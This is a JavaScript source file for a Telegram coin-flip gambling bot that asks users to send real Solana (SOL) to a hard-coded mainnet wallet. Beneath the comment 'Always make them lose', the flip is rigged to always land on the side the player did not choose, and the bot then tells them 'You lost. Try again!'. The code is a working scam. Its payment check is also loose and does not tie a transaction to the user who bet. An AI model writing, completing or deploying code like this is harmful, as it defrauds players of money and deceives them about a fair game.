require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { Connection, clusterApiUrl, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');

const WALLET_ADDRESS = '9HL7W4XZJDX6br3ojjU6BLHp7oZVP3nCDKxQ21TNanQf';
const MIN_BET = 0.01;
const MAX_BET = 1.0;

bot.onText(/\/bet (\d+(\.\d+)?) (heads|tails)/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const betAmount = parseFloat(match[1]);
    const choice = match[3].toLowerCase();

    if (betAmount < MIN_BET || betAmount > MAX_BET) {
        return bot.sendMessage(chatId, `Bet must be between ${MIN_BET} and ${MAX_BET} SOL.`);
    }

    const solReceived = await checkPayment(msg.from.id, betAmount);
    if (!solReceived) {
        return bot.sendMessage(chatId, `Please send exactly ${betAmount} SOL to this wallet:\n\n${WALLET_ADDRESS}\n\nThen run the command again.`);
    }

    bot.sendMessage(chatId, `Bet received. Flipping a coin...`);
    
    // Always make them lose
    const result = choice === 'heads' ? 'tails' : 'heads';

    bot.sendMessage(chatId, `You chose *${choice}*, and it landed *${result}*. You lost. Try again!`, { parse_mode: 'Markdown' });
});

async function checkPayment(userId, expectedSol) {
    const pubKey = new PublicKey(WALLET_ADDRESS);
    const confirmedSignatures = await connection.getSignaturesForAddress(pubKey, { limit: 10 });
    for (let sig of confirmedSignatures) {
        const tx = await connection.getParsedTransaction(sig.signature);
        if (!tx || !tx.meta || !tx.transaction) continue;

        const amount = tx.meta.postBalances[0] - tx.meta.preBalances[0];
        const sol = amount / LAMPORTS_PER_SOL;

        if (sol.toFixed(4) == expectedSol.toFixed(4)) {
            return true;
        }
    }
    return false;
}